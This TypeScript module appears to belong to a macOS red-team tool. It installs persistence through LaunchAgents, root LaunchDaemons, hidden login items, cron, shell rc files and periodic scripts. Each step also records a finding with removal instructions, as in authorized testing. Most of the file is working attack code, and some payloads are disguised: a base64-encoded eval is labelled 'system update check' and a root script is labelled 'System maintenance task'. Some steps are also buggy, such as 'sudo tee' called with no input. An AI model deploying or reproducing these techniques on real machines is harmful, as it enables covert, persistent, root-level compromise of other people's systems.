import { run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function launchagentPersist(args: string[], timeout: number): Promise<HookResult> {
  const label = argVal(args, "--label")
  const command = argVal(args, "--command")
  const interval = argVal(args, "--interval")
  const findings: Finding[] = []
  const output: string[] = ["=== LaunchAgent Persistence ==="]

  if (!label || !command) {
    return {
      output:
        "[!] --label and --command are required. Usage: machook launchagent_persist --label com.cs.agent --command '/bin/bash -c ...' [--interval 300]",
      findings,
    }
  }

  const home = process.env.HOME || "/root"
  const plistDir = `${home}/Library/LaunchAgents`
  const plistPath = `${plistDir}/${label}.plist`

  const mkdirR = await run("mkdir", ["-p", plistDir], timeout)
  if (mkdirR.exitCode !== 0) {
    output.push(`[!] Failed to create LaunchAgents dir: ${mkdirR.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  const cmdParts = command.split(/\s+/)
  const programArgs = cmdParts.map((p) => `    <string>${p}</string>`).join("\n")

  let plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${label}</string>
  <key>ProgramArguments</key>
  <array>
${programArgs}
  </array>
  <key>RunAtLoad</key>
  <true/>`

  if (interval) {
    plist += `
  <key>StartInterval</key>
  <integer>${interval}</integer>`
  }

  plist += `
</dict>
</plist>`

  await Bun.write(plistPath, plist)
  output.push(`[+] Plist written: ${plistPath}`)

  const load = await run("launchctl", ["load", plistPath], timeout)
  if (load.exitCode === 0) {
    output.push(`[+] LaunchAgent loaded: ${label}`)
  }
  if (load.exitCode !== 0) {
    output.push(`[!] launchctl load failed: ${load.stderr.trim()}`)
  }

  findings.push({
    checkId: "MAC-PERSIST-001",
    provider: "macos",
    severity: "high",
    status: "INSTALLED",
    resource: plistPath,
    title: `LaunchAgent persistence installed: ${label}`,
    details: `User-level LaunchAgent at ${plistPath} — runs at login${interval ? `, repeats every ${interval}s` : ""}`,
    remediation: `Remove: launchctl unload ${plistPath} && rm ${plistPath}`,
  })

  return { output: output.join("\n"), findings }
}

export async function launchdaemonPersist(args: string[], timeout: number): Promise<HookResult> {
  const label = argVal(args, "--label")
  const command = argVal(args, "--command")
  const interval = argVal(args, "--interval")
  const findings: Finding[] = []
  const output: string[] = ["=== LaunchDaemon Persistence (root) ==="]

  if (!label || !command) {
    return {
      output:
        "[!] --label and --command are required. Usage: machook launchdaemon_persist --label com.cs.daemon --command '/bin/bash -c ...' [--interval 300]",
      findings,
    }
  }

  const plistPath = `/Library/LaunchDaemons/${label}.plist`
  const cmdParts = command.split(/\s+/)
  const programArgs = cmdParts.map((p) => `    <string>${p}</string>`).join("\n")

  let plist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${label}</string>
  <key>ProgramArguments</key>
  <array>
${programArgs}
  </array>
  <key>RunAtLoad</key>
  <true/>
  <key>KeepAlive</key>
  <true/>`

  if (interval) {
    plist += `
  <key>StartInterval</key>
  <integer>${interval}</integer>`
  }

  plist += `
</dict>
</plist>`

  const write = await run("sudo", ["tee", plistPath], timeout)
  if (write.exitCode !== 0) {
    await Bun.write(plistPath, plist)
  }
  const chown = await run("sudo", ["chown", "root:wheel", plistPath], timeout)
  const chmod = await run("sudo", ["chmod", "644", plistPath], timeout)
  output.push(`[+] Plist written: ${plistPath}`)

  const load = await run("sudo", ["launchctl", "load", plistPath], timeout)
  if (load.exitCode === 0) {
    output.push(`[+] LaunchDaemon loaded as root: ${label}`)
  }
  if (load.exitCode !== 0) {
    output.push(`[!] launchctl load failed (need root): ${load.stderr.trim()}`)
  }

  findings.push({
    checkId: "MAC-PERSIST-002",
    provider: "macos",
    severity: "critical",
    status: "INSTALLED",
    resource: plistPath,
    title: `LaunchDaemon persistence installed: ${label}`,
    details: `Root-level LaunchDaemon at ${plistPath} — runs at boot as root, KeepAlive enabled${interval ? `, repeats every ${interval}s` : ""}`,
    remediation: `Remove: sudo launchctl unload ${plistPath} && sudo rm ${plistPath}`,
  })

  return { output: output.join("\n"), findings }
}

export async function loginItems(args: string[], timeout: number): Promise<HookResult> {
  const appPath = argVal(args, "--path")
  const hidden = hasFlag(args, "--hidden")
  const findings: Finding[] = []
  const output: string[] = ["=== Login Items ==="]

  const existing = await run(
    "osascript",
    ["-e", 'tell application "System Events" to get the name of every login item'],
    timeout,
  )
  if (existing.exitCode === 0 && existing.stdout.trim()) {
    const items = existing.stdout.trim().split(", ")
    output.push(`[+] Current login items (${items.length}):`)
    for (const item of items) output.push(`    ${item}`)
  }
  if (existing.exitCode !== 0) {
    output.push(`[*] Could not enumerate login items: ${existing.stderr.trim()}`)
  }

  if (!appPath) {
    output.push("\n[*] No --path provided — enumeration only mode")
    return { output: output.join("\n"), findings }
  }

  const hiddenStr = hidden ? "true" : "false"
  const script = `tell application "System Events" to make login item at end with properties {path:"${appPath}", hidden:${hiddenStr}}`
  const add = await run("osascript", ["-e", script], timeout)
  if (add.exitCode === 0) {
    output.push(`\n[+] Login item added: ${appPath} (hidden: ${hidden})`)
  }
  if (add.exitCode !== 0) {
    output.push(`\n[!] Failed to add login item: ${add.stderr.trim()}`)
  }

  findings.push({
    checkId: "MAC-PERSIST-003",
    provider: "macos",
    severity: "high",
    status: "INSTALLED",
    resource: appPath,
    title: `Login item persistence: ${appPath.split("/").pop()}`,
    details: `Added ${appPath} as login item (hidden: ${hidden}) — runs at user login`,
    remediation: `Remove via System Settings > General > Login Items, or: osascript -e 'tell application "System Events" to delete login item "${appPath.split("/").pop()}"'`,
  })

  return { output: output.join("\n"), findings }
}

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const command = argVal(args, "--command")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]

  const current = await run("crontab", ["-l"], timeout)
  if (current.exitCode === 0 && current.stdout.trim()) {
    const lines = current.stdout.trim().split("\n").filter(Boolean)
    output.push(`[+] Current crontab (${lines.length} entries):`)
    for (const l of lines) output.push(`    ${l}`)
  }
  if (current.exitCode !== 0) {
    output.push("[*] No existing crontab")
  }

  const etcCron = await run("cat", ["/etc/crontab"], timeout)
  if (etcCron.exitCode === 0 && etcCron.stdout.trim()) {
    output.push(`\n[+] /etc/crontab:`)
    output.push(etcCron.stdout.trim().split("\n").slice(0, 15).join("\n"))
  }

  const cronTabs = await run("ls", ["-la", "/usr/lib/cron/tabs/"], timeout)
  if (cronTabs.exitCode === 0 && cronTabs.stdout.trim()) {
    output.push(`\n[+] /usr/lib/cron/tabs/:`)
    output.push(cronTabs.stdout.trim())
  }

  if (!command) {
    output.push("\n[*] No --command provided — enumeration only mode")
    return { output: output.join("\n"), findings }
  }

  const existing = current.exitCode === 0 ? current.stdout.trim() : ""
  const newEntry = `${schedule} ${command}`
  const newCrontab = existing ? `${existing}\n${newEntry}\n` : `${newEntry}\n`

  const tmpFile = `/tmp/cs-crontab-${Date.now()}`
  await Bun.write(tmpFile, newCrontab)
  const install = await run("crontab", [tmpFile], timeout)
  await run("rm", ["-f", tmpFile], timeout)

  if (install.exitCode === 0) {
    output.push(`\n[+] Cron entry added: ${newEntry}`)
  }
  if (install.exitCode !== 0) {
    output.push(`\n[!] Failed to install crontab: ${install.stderr.trim()}`)
  }

  findings.push({
    checkId: "MAC-PERSIST-004",
    provider: "macos",
    severity: "high",
    status: "INSTALLED",
    resource: "crontab",
    title: "Cron persistence installed",
    details: `Added cron entry: ${newEntry}`,
    remediation: "Remove entry from crontab: crontab -e",
  })

  return { output: output.join("\n"), findings }
}

export async function bashrcPersist(args: string[], timeout: number): Promise<HookResult> {
  const command = argVal(args, "--command")
  const rcFile = argVal(args, "--file") || ".zshrc"
  const findings: Finding[] = []
  const output: string[] = ["=== Shell RC Persistence ==="]

  if (!command) {
    return {
      output: "[!] --command is required. Usage: machook bashrc_persist --command 'nohup /tmp/agent &' [--file .zshrc]",
      findings,
    }
  }

  const home = process.env.HOME || "/root"
  const rcPath = `${home}/${rcFile}`
  const file = Bun.file(rcPath)
  const exists = await file.exists()

  if (exists) {
    const content = await file.text()
    const lines = content.split("\n").length
    output.push(`[+] ${rcFile}: ${lines} lines`)
  }
  if (!exists) {
    output.push(`[*] ${rcFile} does not exist — will create`)
  }

  const payload = `\n# system update check\neval "$(echo '${Buffer.from(command).toString("base64")}' | base64 -D)" 2>/dev/null &\n`

  const existing = exists ? await file.text() : ""
  await Bun.write(rcPath, existing + payload)
  output.push(`[+] Payload injected into ${rcPath}`)
  output.push(`[+] Command will execute on every new shell session`)

  findings.push({
    checkId: "MAC-PERSIST-005",
    provider: "macos",
    severity: "high",
    status: "INSTALLED",
    resource: rcPath,
    title: `Shell RC persistence: ${rcFile}`,
    details: `Injected base64-encoded command into ${rcPath} — executes on every new ${rcFile.includes("zsh") ? "zsh" : "bash"} session`,
    remediation: `Edit ${rcPath} and remove the 'system update check' block`,
  })

  return { output: output.join("\n"), findings }
}

export async function periodicScripts(args: string[], timeout: number): Promise<HookResult> {
  const command = argVal(args, "--command")
  const frequency = argVal(args, "--frequency") || "daily"
  const findings: Finding[] = []
  const output: string[] = ["=== Periodic Scripts Persistence ==="]

  const periodicDirs = ["/etc/periodic/daily", "/etc/periodic/weekly", "/etc/periodic/monthly"]
  for (const dir of periodicDirs) {
    const ls = await run("ls", ["-la", dir], timeout)
    if (ls.exitCode === 0) {
      const scripts = ls.stdout.split("\n").filter((l) => l && !l.startsWith("total") && !l.startsWith("d"))
      output.push(`[+] ${dir}: ${scripts.length} scripts`)
      for (const s of scripts) output.push(`    ${s.trim()}`)
    }
  }

  if (!command) {
    output.push("\n[*] No --command provided — enumeration only mode")
    return { output: output.join("\n"), findings }
  }

  const validFreqs = ["daily", "weekly", "monthly"]
  if (!validFreqs.includes(frequency)) {
    return {
      output: `[!] Invalid frequency: ${frequency}. Must be daily, weekly, or monthly.`,
      findings,
    }
  }

  const scriptName = `800.cs-maintenance`
  const scriptPath = `/etc/periodic/${frequency}/${scriptName}`
  const scriptContent = `#!/bin/sh\n# System maintenance task\n${command}\n`

  const write = await run("sudo", ["tee", scriptPath], timeout)
  if (write.exitCode !== 0) {
    const tmpScript = `/tmp/cs-periodic-${Date.now()}`
    await Bun.write(tmpScript, scriptContent)
    await run("sudo", ["cp", tmpScript, scriptPath], timeout)
    await run("rm", ["-f", tmpScript], timeout)
  }
  await run("sudo", ["chmod", "+x", scriptPath], timeout)
  output.push(`\n[+] Periodic script installed: ${scriptPath}`)
  output.push(`[+] Frequency: ${frequency}`)

  findings.push({
    checkId: "MAC-PERSIST-006",
    provider: "macos",
    severity: "high",
    status: "INSTALLED",
    resource: scriptPath,
    title: `Periodic script persistence: ${frequency}`,
    details: `Installed ${frequency} periodic script at ${scriptPath} — runs as root via periodic(8)`,
    remediation: `Remove: sudo rm ${scriptPath}`,
  })

  return { output: output.join("\n"), findings }
}
